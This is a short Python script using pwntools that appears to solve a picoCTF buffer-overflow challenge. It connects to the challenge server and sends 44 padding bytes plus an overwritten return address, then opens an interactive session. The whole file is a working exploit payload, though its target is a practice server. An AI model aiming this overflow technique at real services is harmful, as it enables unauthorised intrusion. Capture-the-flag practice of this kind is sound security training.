import os
from pwn import *

os.system('clear')

sh = remote('saturn.picoctf.net', 63239)

sh.recvuntil('string: ')
p = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'
sh.sendline(p)


sh.interactive()
